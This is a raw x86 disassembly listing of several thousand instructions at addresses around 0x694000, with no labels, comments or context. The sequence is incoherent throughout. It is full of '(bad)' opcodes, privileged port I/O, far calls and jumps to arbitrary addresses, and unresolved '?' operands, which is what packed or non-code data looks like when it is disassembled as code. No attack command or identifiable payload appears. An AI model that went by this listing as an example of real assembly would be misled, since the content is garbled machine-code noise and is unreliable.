  69457b:	and    BYTE PTR [esi-0xf],ah
  69457e:	adc    ch,BYTE PTR [edi+eax*1+0x3c63b54d]
  694585:	add    BYTE PTR [ecx+0x2f],0x19
  694589:	jp     0x69455d
  69458b:	in     al,dx
  69458c:	mov    BYTE PTR [edx+0x664997fd],al
  694592:	mov    edi,edx
  694594:	sub    ecx,ebp
  694596:	sub    bh,BYTE PTR [ecx]
  694598:	into   
  694599:	aas    
  69459a:	push   es
  69459b:	addr16 cs (bad) 
  69459e:	imul   esi,DWORD PTR [ebx-0xf],0xffffff83
  6945a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6945a3:	aas    
  6945a4:	fstp   QWORD PTR [eax-0xe]
  6945a7:	inc    ecx
  6945a8:	xchg   ebp,eax
  6945a9:	dec    ebx
  6945aa:	test   DWORD PTR [esp+eax*8],ecx
  6945ad:	lods   al,BYTE PTR ds:[esi]
  6945ae:	pop    ebx
  6945af:	and    eax,0x972aae1f
  6945b4:	sbb    eax,0x93022183
  6945b9:	outs   dx,DWORD PTR ds:[esi]
  6945ba:	jne    0x69460c
  6945bc:	shl    DWORD PTR [edi],1
  6945be:	and    eax,0xbfec8293
  6945c3:	add    al,0x11
  6945c5:	adc    ecx,edi
  6945c7:	pop    ebx
  6945c8:	popf   
  6945c9:	mov    BYTE PTR [esi-0x33],dh
  6945cc:	xchg   ebx,eax
  6945cd:	adc    BYTE PTR [edi+0x6e],ch
  6945d0:	cmp    eax,0xd4e70781
  6945d5:	cmp    bh,BYTE PTR [esi+0x7c24a209]
  6945db:	sub    eax,0xb614eda2
  6945e0:	mov    BYTE PTR [eax-0x39],0xea
  6945e4:	add    edi,eax
  6945e6:	jmp    0xff9a91c8
  6945eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6945ec:	fistp  WORD PTR [ebx-0x67be3194]
  6945f2:	sbb    eax,0xf0fcc614
  6945f7:	inc    esi
  6945f8:	sub    DWORD PTR [esi-0x117e965f],0x2ca81cc1
  694602:	(bad)  
  694604:	mov    bl,0xa4
  694606:	dec    edx
  694607:	add    al,0x1c
  694609:	sbb    al,0x55
  69460b:	mov    ebx,0x8fb0c3ca
  694610:	sbb    DWORD PTR [ebx-0x2ac24306],ebx
  694616:	mov    eax,ds:0x43f6fdad
  69461b:	xchg   esp,eax
  69461c:	mov    bh,0xa9
  69461e:	mov    dh,0x59
  694620:	jbe    0x6945c8
  694622:	add    DWORD PTR [eax+ebx*8+0x69],0xffffffc4
  694627:	push   ss
  694628:	stc    
  694629:	mov    ah,0x6a
  69462b:	mov    dh,0x79
  69462d:	pushf  
  69462e:	inc    edi
  69462f:	cs pop es
  694631:	mov    ecx,0x4bd9ded8
  694636:	sbb    esp,DWORD PTR [edi+0x59]
  694639:	out    dx,eax
  69463a:	push   esi
  69463b:	pop    eax
  69463c:	in     eax,dx
  69463d:	jge    0x6945e3
  69463f:	daa    
  694640:	add    DWORD PTR [ebp+0x7b],eax
  694643:	pop    esi
  694644:	cmp    ebp,DWORD PTR [edx-0x6]
  694647:	xor    DWORD PTR [edx],esi
  694649:	fnsave [esi+0x1e]
  69464c:	loopne 0x694671
  69464e:	sbb    BYTE PTR [ebx-0x18439413],0x9d
  694655:	xor    esi,DWORD PTR [esi]
  694657:	pop    edx
  694658:	lahf   
  694659:	fldcw  WORD PTR [esi]
  69465b:	or     DWORD PTR [esi+0x14027258],0x4a379e58
  694665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  694666:	(bad)  
  694667:	hlt    
  694668:	mov    ebx,0x553934df
  69466d:	repz add DWORD PTR [esi],esi
  694670:	push   eax
  694671:	and    edx,DWORD PTR [ebx]
  694673:	and    dl,BYTE PTR [eax+ebp*8]
  694676:	call   0x7cd2:0x4787aab5
  69467d:	outs   dx,DWORD PTR ds:[esi]
  69467e:	and    eax,0xbbddebe
  694683:	shr    DWORD PTR [ebp+0x54],0xa2
  694687:	lds    esi,FWORD PTR [eax]
  694689:	adc    DWORD PTR [eax],esi
  69468b:	inc    ebx
  69468c:	cwde   
  69468d:	xchg   edx,eax
  69468e:	icebp  
  69468f:	pop    edx
  694690:	fs and al,0xb0
  694693:	mov    ch,0xbc
  694695:	or     BYTE PTR [edi],cl
  694697:	mov    ebp,DWORD PTR [edi]
  694699:	push   ss
  69469a:	xchg   edx,eax
  69469b:	dec    esp
  69469c:	push   esi
  69469d:	bound  edx,QWORD PTR [eax]
  69469f:	das    
  6946a0:	mov    dh,0x1a
  6946a2:	shr    BYTE PTR ds:0x73787906,cl
  6946a8:	loop   0x69464e
  6946aa:	adc    DWORD PTR [esi+0x5ecdb038],esp
  6946b0:	and    BYTE PTR [esi+0x34],bl
  6946b3:	scas   eax,DWORD PTR es:[edi]
  6946b4:	mov    WORD PTR [ecx],gs
  6946b6:	sub    eax,DWORD PTR [esi-0x45ec66d5]
  6946bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6946bd:	icebp  
  6946be:	mov    al,cs:0xb177d2d5
  6946c4:	and    al,dh
  6946c6:	bnd ret 0xb344
  6946ca:	(bad)  
  6946cb:	adc    DWORD PTR [edx+edx*1+0x6da48c41],eax
  6946d2:	jmp    0x92f614af
  6946d7:	nop
  6946d8:	mov    ebp,0x395b6690
  6946dd:	mov    bl,BYTE PTR [ecx]
  6946df:	and    BYTE PTR [eax],bl
  6946e1:	ss inc ebp
  6946e3:	fimul  WORD PTR [edx+0x2aa7fdca]
  6946e9:	ret    
  6946ea:	ins    DWORD PTR es:[edi],dx
  6946eb:	rcl    DWORD PTR [edi+0x352327e],0xbd
  6946f2:	xchg   esi,eax
  6946f3:	or     dl,BYTE PTR [eax]
  6946f5:	adc    BYTE PTR [eax],ch
  6946f7:	shl    BYTE PTR [ebx],1
  6946f9:	jbe    0x6946c0
  6946fb:	aas    
  6946fc:	push   edi
  6946fd:	add    BYTE PTR [eax+edx*2],0xc3
  694701:	test   DWORD PTR [esp+ebx*4+0x11],ebp
  694705:	lods   al,BYTE PTR ds:[esi]
  694706:	in     eax,dx
  694707:	mov    dl,0xdb
  694709:	repnz xchg ebp,eax
  69470b:	ret    0x77b6
  69470e:	mov    al,ds:0x67b147e6
  694713:	pop    ecx
  694714:	arpl   dx,dx
  694716:	enter  0xde64,0xa1
  69471a:	add    ah,BYTE PTR [ebx-0x29]
  69471d:	push   0xf2d276d8
  694722:	push   esi
  694723:	call   0x10b1:0xfa668c9
  69472a:	test   cl,bh
  69472c:	or     ecx,0x6f
  69472f:	lahf   
  694730:	fs xor edx,edx
  694733:	cmp    eax,0xe93e2908
  694738:	popf   
  694739:	mov    WORD PTR [ecx+0x5c20a882],fs
  69473f:	icebp  
  694740:	push   esi
  694741:	sbb    ah,0x5d
  694744:	mov    ecx,0x1686046e
  694749:	push   ds
  69474a:	(bad)  
  69474b:	(bad)
  69474f:	xor    edi,DWORD PTR [ebx+0x71]
  694752:	mov    dh,BYTE PTR [eax+eiz*8+0x27]
  694756:	cmp    al,bh
  694758:	es sahf 
  69475a:	inc    ecx
  69475b:	out    dx,al
  69475c:	mov    ds,WORD PTR [ebx+0x34a9d8d0]
  694762:	cli    
  694763:	push   0x81c94038
  694768:	inc    ebx
  694769:	dec    ebp
  69476a:	retf   
  69476b:	shl    BYTE PTR [eax],0xa9
  69476e:	xchg   ebp,eax
  69476f:	ror    ebp,cl
  694771:	mov    cl,0x58
  694773:	aaa    
  694774:	mov    dl,0xd7
  694776:	pop    eax
  694777:	dec    eax
  694778:	sti    
  694779:	into   
  69477a:	xchg   esi,eax
  69477b:	push   0xffffffff
  69477d:	push   es
  69477e:	lahf   
  69477f:	stc    
  694780:	pop    ecx
  694781:	test   ebp,edi
  694783:	pop    ebx
  694784:	out    dx,eax
  694785:	sub    ch,bl
  694787:	mov    al,BYTE PTR [ebx-0x6d674c47]
  69478d:	mov    ds:0x399286ea,eax
  694792:	jo     0x694720
  694794:	(bad)  
  694795:	cmp    DWORD PTR [esi-0x18487d31],ecx
  69479b:	int3   
  69479c:	adc    ebp,DWORD PTR [ebx]
  69479e:	in     al,0x1f
  6947a0:	mov    al,0x53
  6947a2:	mov    DWORD PTR [ecx+0x39],0xbf26e9ee
  6947a9:	mov    ds:0xf9536bec,al
  6947ae:	xor    BYTE PTR [eax+0x2d4db671],ah
  6947b4:	sub    DWORD PTR [ecx+ebx*4],ecx
  6947b7:	push   cs
  6947b8:	sub    DWORD PTR [esi+eax*2],esp
  6947bb:	imul   esi,ebp,0xfffffffb
  6947be:	out    dx,eax
  6947bf:	(bad)
  6947c2:	and    ch,BYTE PTR [ebx+esi*1]
  6947c5:	out    dx,eax
  6947c6:	jno    0x6947ff
  6947c8:	cmp    DWORD PTR [edi-0x21],0xffffffac
  6947cc:	adc    DWORD PTR [ecx-0x53],ebx
  6947cf:	xor    al,0x4b
  6947d1:	dec    edx
  6947d2:	xlat   BYTE PTR ds:[ebx]
  6947d3:	hlt    
  6947d4:	mov    esi,0x3087bda0
  6947d9:	aam    0x62
  6947db:	mov    eax,ds:0xf344f15e
  6947e0:	test   al,0xef
  6947e2:	repz leave 
  6947e4:	ins    DWORD PTR es:[edi],dx
  6947e5:	or     DWORD PTR [esi-0x43],0x72
  6947e9:	pushf  
  6947ea:	jne    0x694838
  6947ec:	jns    0x69478f
  6947ee:	int3   
  6947ef:	mov    ch,0x8e
  6947f1:	jle    0x69485c
  6947f3:	add    DWORD PTR [ebx-0xaf32fa9],ebp
  6947f9:	into   
  6947fa:	adc    esp,DWORD PTR [edi+0x59]
  6947fd:	pop    es
  6947fe:	into   
  6947ff:	mov    al,0xba
  694801:	mov    ?,WORD PTR [edi+ecx*2-0x41f3e30]
  694808:	loope  0x6947e9
  69480a:	inc    eax
  69480b:	add    eax,DWORD PTR [eax+0x70]
  69480e:	loop   0x6947e6
  694810:	fs mov ebp,0xd2c2424a
  694816:	and    BYTE PTR [esi-0x14],dl
  694819:	and    DWORD PTR [eax-0x2a4951ff],edx
  69481f:	cmp    BYTE PTR [edx-0x4b6cd1ae],0x0
  694826:	pop    ebp
  694827:	retf   
  694828:	(bad)  
  694829:	mov    bl,0x8
  69482b:	cli    
  69482c:	jb     0x69485e
  69482e:	int3   
  69482f:	leave  
  694830:	dec    edi
  694831:	and    eax,0x26b0331c
  694836:	mov    eax,0x8cc73240
  69483b:	(bad)  
  69483c:	cli    
  69483d:	mov    DWORD PTR [esp+ebp*1-0x5a],esi
  694841:	leave  
  694842:	xor    ah,BYTE PTR [ebx+0x1ccc5fd1]
  694848:	jl     0x694834
  69484a:	mov    ch,0x19
  69484c:	pop    es
  69484d:	xchg   BYTE PTR [edi-0x16b2b4e2],dh
  694853:	dec    ebp
  694854:	cmp    eax,0xff6efea
  694859:	loope  0x6948d3
  69485b:	dec    edi
  69485c:	cmp    edi,esi
  69485e:	push   ss
  69485f:	(bad)  
  694861:	mov    ecx,0x5891c3f3
  694866:	sub    eax,0x5d24ae8a
  69486b:	call   0xb7e6:0x22316689
  694872:	xor    cl,al
  694874:	pop    edi
  694875:	(bad)  
  694876:	mov    al,0x4a
  694878:	imul   edi,DWORD PTR [edx+0x6e],0x7dcae32
  69487f:	into   
  694880:	ret    
  694881:	mov    esi,0x828596e1
  694886:	sub    al,0xad
  694888:	pop    edi
  694889:	dec    ebp
  69488a:	out    dx,al
  69488b:	and    eax,0xb4782459
  694890:	test   BYTE PTR [esi+edi*1-0x5b],dl
  694894:	xchg   DWORD PTR [ecx+0x65],ecx
  694897:	repz add al,0xec
  69489a:	shl    DWORD PTR [edx-0x11],cl
  69489d:	or     al,0xd9
  69489f:	int3   
  6948a0:	lahf   
  6948a1:	adc    eax,0xc614bf72
  6948a6:	mov    esi,fs
  6948a8:	cdq    
  6948a9:	inc    esp
  6948aa:	arpl   ax,si
  6948ac:	daa    
  6948ad:	rcr    BYTE PTR [edx+0x16dedb8e],0xd6
  6948b4:	jg     0x69487a
  6948b6:	int    0x31
  6948b8:	popf   
  6948b9:	fs sahf 
  6948bb:	mov    bl,0xd7
  6948bd:	sbb    eax,0xff9f6f58
  6948c2:	dec    edi
  6948c3:	in     eax,dx
  6948c4:	popa   
  6948c5:	xor    cl,dl
  6948c7:	or     BYTE PTR [ecx],ah
  6948c9:	push   esi
  6948ca:	mov    dl,0x76
  6948cc:	test   eax,0x8ebf42c8
  6948d1:	inc    edi
  6948d2:	add    ch,bh
  6948d4:	push   ss
  6948d5:	lods   eax,DWORD PTR ds:[esi]
  6948d6:	inc    esi
  6948d7:	sbb    eax,0xb31ad227
  6948dc:	shl    BYTE PTR [edx-0xc996397],0xbf
  6948e3:	inc    eax
  6948e4:	lock cld 
  6948e6:	dec    ebx
  6948e7:	test   BYTE PTR [eax-0x543edaaa],ch
  6948ed:	inc    edx
  6948ee:	sub    dh,BYTE PTR [edx-0x2caadb57]
  6948f4:	mov    ds:0xd0396912,al
  6948f9:	and    al,0xe7
  6948fb:	fucomip st,st(2)
  6948fd:	sbb    eax,0x6299eb25
  694902:	ins    BYTE PTR es:[edi],dx
  694903:	fstp   QWORD PTR [edx]
  694905:	mov    ah,0x94
  694907:	jge    0x694927
  694909:	pop    ds
  69490a:	int3   
  69490b:	fs adc edi,edx
  69490e:	adc    eax,0x66ca51b9
  694913:	pop    ecx
  694914:	add    eax,0x8eb3f7cf
  694919:	adc    dh,al
  69491b:	pop    esi
  69491c:	test   dh,0x74
  69491f:	push   ebp
  694920:	add    BYTE PTR [eax+edi*8+0x19],0xeb
  694925:	test   eax,0x998ef347
  69492a:	push   0xffffffe2
  69492c:	out    0x5f,al
  69492e:	int    0x97
  694930:	(bad)  
  694931:	jg     0x6948e7
  694933:	push   edi
  694934:	xor    al,0x36
  694936:	(bad)  
  694937:	shl    ebx,1
  694939:	js     0x694917
  69493b:	loop   0x6949ae
  69493d:	xchg   ecx,eax
  69493e:	add    bh,dl
  694940:	mov    cl,0x8f
  694942:	cdq    
  694943:	xlat   BYTE PTR ds:[ebx]
  694944:	add    DWORD PTR ds:0x319ce04c,esi
  69494a:	lea    ebx,[edx+eax*2+0x5f6e1116]
  694951:	add    BYTE PTR [edi+0x2e6f58f5],0x8d
  694958:	test   BYTE PTR ds:0x2b4ca901,bh
  69495e:	inc    ecx
  69495f:	jno    0x69497e
  694961:	xlat   BYTE PTR ds:[ebx]
  694962:	into   
  694963:	imul   ebx,DWORD PTR [eax],0xcbf68926
  694969:	mov    WORD PTR [ebp+esi*1+0xd],?
  69496d:	mov    ah,0xff
  69496f:	cdq    
  694970:	sbb    DWORD PTR [ebx+0x48f8c1a0],edx
  694976:	ja     0x694970
  694978:	push   edx
  694979:	push   ebx
  69497a:	push   edi
  69497b:	nop
  69497c:	jge    0x69497c
  69497e:	lods   al,BYTE PTR ds:[esi]
  69497f:	loopne 0x694984
  694981:	call   0x3dac5707
  694986:	cmp    eax,0x4235e925
  69498b:	popf   
  69498c:	popa   
  69498d:	sti    
  69498e:	outs   dx,BYTE PTR ds:[esi]
  69498f:	pop    esp
  694990:	or     ecx,DWORD PTR [esi]
  694992:	add    DWORD PTR [eax+edi*1-0x57],eax
  694996:	cli    
  694997:	xor    BYTE PTR [esp+edi*8],ch
  69499a:	fimul  DWORD PTR [edx+0x5ac68acf]
  6949a0:	out    0xfc,al
  6949a2:	dec    ebx
  6949a3:	test   DWORD PTR [edx],ebp
  6949a5:	mov    al,0xb6
  6949a7:	xchg   esi,eax
  6949a8:	imul   edx,DWORD PTR [edx-0x32fb774d],0x18
  6949af:	test   DWORD PTR [ecx+0x4ecc88cd],0x9c8b7378
  6949b9:	add    esi,DWORD PTR [ecx+0x59da43e7]
  6949bf:	(bad)  
  6949c1:	mov    edi,?
  6949c3:	not    BYTE PTR [edi-0x307a131b]
  6949c9:	jbe    0x694a06
  6949cb:	ror    BYTE PTR [ebp+0x4e9e5a5d],0x29
  6949d2:	and    eax,0xd68e1861
  6949d7:	push   cs
  6949d8:	cld    
  6949d9:	(bad)  
  6949da:	jmp    FWORD PTR [edx]
  6949dc:	mov    bl,0x39
  6949de:	into   
  6949df:	mov    al,0x63
  6949e1:	sti    
  6949e2:	jp     0x694a28
  6949e4:	add    esp,edx
  6949e6:	cmp    al,0x79
  6949e8:	sub    ecx,DWORD PTR [edi-0x48]
  6949eb:	(bad)  
  6949ec:	jg     0x694a0e
  6949ee:	pop    ebp
  6949ef:	ja     0x694974
  6949f1:	and    DWORD PTR [edx+0x49055f1f],ebx
  6949f7:	das    
  6949f8:	inc    ecx
  6949f9:	sti    
  6949fa:	stc    
  6949fb:	pop    ds
  6949fc:	aam    0x75
  6949fe:	dec    ebx
  694a00:	ins    BYTE PTR es:[edi],dx
  694a01:	pop    ebp
  694a02:	pop    ecx
  694a03:	or     ebp,DWORD PTR [eax-0x471399df]
  694a09:	fimul  WORD PTR [ecx-0x5ddf7d80]
  694a0f:	mov    bl,0xf5
  694a11:	les    esp,FWORD PTR [ebp-0x3c]
  694a14:	jp     0x694a5f
  694a16:	inc    esi
  694a17:	mov    esp,0x2e3e9bdb
  694a1c:	xchg   edx,eax
  694a1d:	sti    
  694a1e:	fcmovu st,st(3)
  694a20:	mov    ebp,0x36f3bc04
  694a25:	adc    BYTE PTR ds:0x3faf4d2f,0xbf
  694a2c:	ret    0xc636
  694a2f:	add    DWORD PTR [esi+0x3b549c93],ecx
  694a35:	push   ebx
  694a36:	sub    bh,dl
  694a38:	mov    gs,WORD PTR [eax]
  694a3a:	mov    cl,0x5
  694a3c:	fistp  DWORD PTR [edi]
  694a3e:	jmp    0x6949ca
  694a40:	(bad)  
  694a41:	js     0x6949cd
  694a43:	fiadd  DWORD PTR [esi+0x33d253ba]
  694a49:	(bad)  
  694a4a:	add    BYTE PTR [eax-0xd36ffd0],dl
  694a50:	inc    BYTE PTR [ebx]
  694a52:	inc    ebx
  694a53:	mov    ds:0x5542f9d7,al
  694a58:	xchg   ecx,eax
  694a59:	retf   0x660d
  694a5c:	ret    
  694a5d:	mov    ebp,0x6a613626
  694a62:	add    cl,dh
  694a64:	push   ds
  694a65:	jns    0x694a5d
  694a67:	jns    0x694a98
  694a69:	xchg   edx,eax
  694a6a:	sub    DWORD PTR [esi+eax*8+0x1ce2f0ee],esp
  694a71:	mov    fs,WORD PTR [edi-0xa065da7]
  694a77:	(bad)  
  694a78:	xchg   ecx,eax
  694a79:	scas   eax,DWORD PTR es:[edi]
  694a7a:	sub    al,BYTE PTR [esp+ecx*8-0x50]
  694a7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  694a7f:	imul   ecx,DWORD PTR [ebx+0x78],0x16
  694a83:	loopne 0x694b04
  694a85:	retf   
  694a86:	add    BYTE PTR [edi-0x679ef00b],ah
  694a8c:	pusha  
  694a8d:	push   edi
  694a8e:	adc    al,0x74
  694a90:	push   cs
  694a91:	in     al,dx
  694a92:	xchg   ecx,eax
  694a93:	int    0x9e
  694a95:	idiv   DWORD PTR [ebp-0x768c7dcb]
  694a9b:	nop
  694a9c:	pop    ebp
  694a9d:	dec    edx
  694a9e:	repnz add eax,0xe770b0a
  694aa4:	adc    dl,BYTE PTR [esi]
  694aa6:	in     eax,dx
  694aa7:	mov    esi,0x9af786d3
  694aac:	int3   
  694aad:	mov    ds,WORD PTR [eax]
  694aaf:	inc    edx
  694ab0:	dec    edi
  694ab1:	in     al,0xde
  694ab3:	loop   0x694ae5
  694ab5:	xchg   esi,eax
  694ab6:	out    dx,al
  694ab7:	jge    0x694b1a
  694ab9:	xchg   ebp,eax
  694aba:	retf   
  694abb:	in     eax,dx
  694abc:	and    DWORD PTR [edx],esi
  694abe:	js     0x694ae0
  694ac0:	test   al,0x91
  694ac2:	sub    BYTE PTR [ebp+0x68],cl
  694ac5:	or     bl,bl
  694ac7:	jg     0x694b06
  694ac9:	out    dx,eax
  694aca:	inc    edi
  694acb:	ret    0xfa8b
  694ace:	nop
  694acf:	aas    
  694ad0:	mov    WORD PTR [edi+0x95ffccf],cs
  694ad6:	imul   esi,DWORD PTR [eax-0x49388752],0x1fed3c0e
  694ae0:	sub    bl,BYTE PTR [ebx+0x73]
  694ae3:	mov    al,ds:0x239ea222
  694ae8:	jmp    0x694ae1
  694aea:	pop    esp
  694aeb:	pop    es
  694aec:	jp     0x694a71
  694aee:	adc    ebp,esp
  694af0:	dec    esi
  694af1:	add    dh,BYTE PTR [edx]
  694af3:	sbb    BYTE PTR [edi+ecx*2-0x57],ch
  694af7:	in     al,dx
  694af8:	leave  
  694af9:	test   DWORD PTR [edx+0x22a6ee8a],0x249cb89a
  694b03:	gs pop ebp
  694b05:	or     bh,bl
  694b07:	in     eax,dx
  694b08:	xchg   ecx,eax
  694b09:	pop    edx
  694b0a:	loopne 0x694a9a
  694b0c:	add    eax,0xc423247d
  694b11:	repnz call FWORD PTR [ebx+0x2066fadf]
  694b18:	add    eax,0x97382557
  694b1d:	hlt    
  694b1e:	cmp    ebp,DWORD PTR [eax+ecx*2-0x3ef10844]
  694b25:	sbb    DWORD PTR [ecx+0x6a],ebx
  694b28:	cld    
  694b29:	adc    ah,BYTE PTR [edi-0x33996447]
  694b2f:	push   ebp
  694b30:	stc    
  694b31:	cmp    al,0xd9
  694b33:	inc    ebx
  694b34:	jmp    0x5a21:0x8cb0d45
  694b3b:	push   ds
  694b3c:	push   ecx
  694b3d:	dec    edx
  694b3e:	push   eax
  694b3f:	jge    0x694b7d
  694b41:	rol    BYTE PTR [ecx+0x59fe4bdf],cl
  694b47:	and    dl,al
  694b49:	or     al,ah
  694b4b:	in     al,0xb1
  694b4d:	jecxz  0x694ba3
  694b4f:	jmp    0x38a7f616
  694b54:	ret    0x6cb5
  694b57:	stos   BYTE PTR es:[edi],al
  694b58:	xchg   DWORD PTR [bp-0x2c],ecx
  694b5c:	bound  edx,QWORD PTR [edi+0x4ba011f7]
  694b62:	xor    DWORD PTR [edi-0x5f],0xa89dc1a1
  694b69:	push   0xe
  694b6b:	cmp    BYTE PTR [ebx+0x4],al
  694b6e:	pop    ss
  694b6f:	fstp   TBYTE PTR [ebx-0x5a]
  694b72:	out    dx,al
  694b73:	jne    0x694b2e
  694b75:	jmp    FWORD PTR [ecx+0x4212d776]
  694b7b:	xchg   ebp,eax
  694b7c:	into   
  694b7d:	cmp    al,0xc0
  694b7f:	bound  edi,QWORD PTR [esi]
  694b81:	sub    DWORD PTR [edi+edi*1],esi
  694b84:	fxch   st(1)
  694b86:	or     al,0x3a
  694b88:	xlat   BYTE PTR ds:[ebx]
  694b89:	ror    esi,cl
  694b8b:	mov    cl,0xa5
  694b8d:	mov    ds:0x76231b6,al
  694b92:	xchg   esp,edi
  694b94:	cmp    DWORD PTR [eax],esp
  694b96:	and    DWORD PTR [edi],0x2cadcaed
  694b9c:	jns    0x694b64
  694b9e:	xor    esp,DWORD PTR [eax+0x75ebf911]
  694ba4:	sbb    esi,ebp
  694ba6:	jp     0x694b50
  694ba8:	test   eax,0x87b9fa21
  694bad:	aas    
  694bae:	mov    ds:0xa3e4c056,eax
  694bb3:	mov    BYTE PTR [edx-0x129d6cb7],0x36
  694bba:	int    0xea
  694bbc:	mov    dh,0x2b
  694bbe:	jb     0x694c2a
  694bc0:	fs cdq 
  694bc2:	xor    bh,dh
  694bc4:	or     al,0x5e
  694bc6:	xor    al,BYTE PTR [ebx-0xbce1dee]
  694bcc:	shl    ah,1
  694bce:	xchg   esi,eax
  694bcf:	mov    cl,0xca
  694bd1:	inc    edi
  694bd2:	xchg   ecx,eax
  694bd3:	push   esi
  694bd4:	popf   
  694bd5:	shr    BYTE PTR [ebp+0x5962643f],cl
  694bdb:	sub    eax,0x9b1dc613
  694be0:	div    DWORD PTR [eax+0x419f8f99]
  694be6:	outs   dx,BYTE PTR ds:[esi]
  694be7:	jmp    0xf50c73fa
  694bec:	adc    eax,0x1bd8b29d
  694bf1:	ins    BYTE PTR es:[edi],dx
  694bf2:	iret   
  694bf3:	cdq    
  694bf4:	xchg   esp,eax
  694bf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  694bf6:	mov    bh,cl
  694bf8:	push   ebx
  694bf9:	in     al,dx
  694bfa:	dec    ebx
  694bfb:	popa   
  694bfc:	out    dx,al
  694bfd:	xchg   edx,eax
  694bfe:	jmp    0x119c3314
  694c03:	imul   esi,DWORD PTR [esi],0xffffffa6
  694c06:	pop    edi
  694c07:	cwde   
  694c08:	xor    ecx,DWORD PTR [eax+0x4e8948aa]
  694c0e:	jno    0x694c57
  694c10:	mov    bl,0xdd
  694c12:	jecxz  0x694c6d
  694c14:	stc    
  694c15:	inc    ebx
  694c16:	int3   
  694c17:	les    eax,FWORD PTR [edi+0x1808b762]
  694c1d:	loope  0x694c93
  694c1f:	xchg   DWORD PTR ss:[esi+0x13403020],eax
  694c26:	jne    0x694bbd
  694c28:	or     eax,0xc3909298
  694c2d:	jne    0x694c00
  694c2f:	add    DWORD PTR ds:0x6b70f2c,ecx
  694c35:	mov    eax,0x950e48f5
  694c3a:	call   0xe5c5:0xa48b0161
  694c41:	out    dx,al
  694c42:	jg     0x694c33
  694c44:	(bad)  
  694c45:	iret   
  694c46:	repnz push es
  694c48:	rcr    DWORD PTR [edi+0x2d],cl
  694c4b:	adc    BYTE PTR [ebp+0x210e8118],cl
  694c51:	ins    BYTE PTR es:[edi],dx
  694c52:	into   
  694c53:	aas    
  694c54:	or     eax,DWORD PTR [edx]
  694c56:	aaa    
  694c57:	push   0x5c48dde1
  694c5c:	sti    
  694c5d:	paddw  mm7,QWORD PTR [ebx]
  694c60:	cmp    BYTE PTR [eax],ch
  694c62:	inc    ecx
  694c63:	iret   
  694c64:	popf   
  694c65:	inc    ebx
  694c66:	adc    eax,DWORD PTR [ecx+0x6448dc31]
  694c6c:	sub    DWORD PTR [ebx+0x2d],edi
  694c6f:	pop    es
  694c70:	sub    al,0x94
  694c72:	adc    eax,0xcd986304
  694c77:	enter  0x3b05,0xc5
  694c7b:	jbe    0x694c1a
  694c7d:	xor    al,0x3c
  694c7f:	pop    esp
  694c80:	js     0x694c94
  694c82:	dec    esp
  694c83:	add    al,0xec
  694c85:	fld    DWORD PTR [ebx-0x35]
  694c88:	(bad)  
  694c89:	idiv   esi
  694c8b:	les    ebx,FWORD PTR [edx+0x20474196]
  694c91:	push   edx
  694c92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  694c93:	mov    esp,0x13d56021
  694c98:	shl    DWORD PTR [ebp-0x45],cl
  694c9b:	add    al,ch
  694c9d:	xor    eax,DWORD PTR [edi-0x13]
  694ca0:	push   0x3f016962
  694ca5:	adc    DWORD PTR [ecx],ecx
  694ca7:	fdivr  DWORD PTR [eax+0x7a59bd5e]
  694cad:	mov    bh,0xc0
  694caf:	inc    DWORD PTR [ecx-0x54e5ae0b]
  694cb5:	call   0x8a80fac3
  694cba:	sbb    edx,ebp
  694cbc:	mov    cl,0xfd
  694cbe:	jecxz  0x694ccb
  694cc0:	jb     0x694cad
  694cc2:	fprem  
  694cc4:	outs   dx,BYTE PTR ds:[esi]
  694cc5:	cld    
  694cc6:	call   0x922d:0xf2619464
  694ccd:	or     edx,DWORD PTR [esi+0x1070bce8]
  694cd3:	dec    edi
  694cd4:	imul   di,WORD PTR [ebx+0x157512c1],0x7cdc
  694cdd:	fst    st(5)
  694cdf:	mov    BYTE PTR [edx+0xd],bl
  694ce2:	jle    0x694d3e
  694ce4:	dec    edi
  694ce6:	popf   
  694ce7:	(bad)  
  694ce8:	dec    esp
  694ce9:	(bad)  
  694cea:	pusha  
  694ceb:	push   esp
  694cec:	fist   DWORD PTR ds:0x9c1507f3
  694cf2:	rcl    DWORD PTR [ebx],1
  694cf4:	cli    
  694cf5:	mov    ah,0x4a
  694cf7:	out    0x84,al
  694cf9:	bound  ebx,QWORD PTR [edx]
  694cfb:	repnz hlt 
  694cfd:	dec    edi
  694cfe:	in     eax,0x9d
  694d00:	(bad)  [edx]
  694d02:	sub    edx,DWORD PTR [eax+0x6]
  694d05:	fldcw  WORD PTR [ebp+0x350f3ab2]
  694d0b:	cmp    eax,0xbf6c078b
  694d10:	and    dl,BYTE PTR [ebx-0x1d]
  694d13:	xor    eax,0xac429ab3
  694d18:	dec    ecx
  694d19:	ss push ecx
  694d1b:	call   0x7273:0x87df571f
  694d22:	sub    eax,0x6d3bc2fd
  694d27:	sti    
  694d28:	or     esi,DWORD PTR [edi+edx*8+0x60]
  694d2c:	enter  0xad40,0x28
  694d30:	inc    edi
  694d31:	adc    BYTE PTR [eax],ch
  694d33:	inc    ebp
  694d34:	mov    edx,0xd76986a9
  694d39:	xchg   ebx,eax
  694d3a:	cmc    
  694d3b:	loopne 0x694d43
  694d3d:	pop    esi
  694d3e:	popa   
  694d3f:	mov    ss,WORD PTR [edx*4+0x370c9ed4]
  694d46:	(bad)  [esp+esi*8+0x7e]
  694d4a:	outs   dx,BYTE PTR ds:[esi]
  694d4b:	enter  0x5e20,0x31
  694d4f:	imul   esi,edi,0xeb2ed307
  694d55:	adc    DWORD PTR [ecx],edx
  694d57:	and    edx,DWORD PTR [edi+0x61]
  694d5a:	std    
  694d5b:	and    DWORD PTR [edi+0x16],esi
  694d5e:	xor    eax,0x8508f8ab
  694d63:	sub    dl,ch
  694d65:	mov    ss,WORD PTR [ebx-0x2b]
  694d68:	into   
  694d69:	rol    eax,1
  694d6b:	jmp    0xcd51:0x448fb4b6
  694d72:	ret    
  694d73:	push   esp
  694d74:	mov    ecx,0xe813932a
  694d79:	cwde   
  694d7a:	sub    edi,esi
  694d7c:	and    eax,DWORD PTR [edi]
  694d7e:	shl    DWORD PTR [ebx+ebp*4+0x28082637],0x6b
  694d86:	or     al,0xea
  694d88:	mov    cl,0x1f
  694d8a:	inc    eax
  694d8b:	push   esp
  694d8c:	mov    ah,0x77
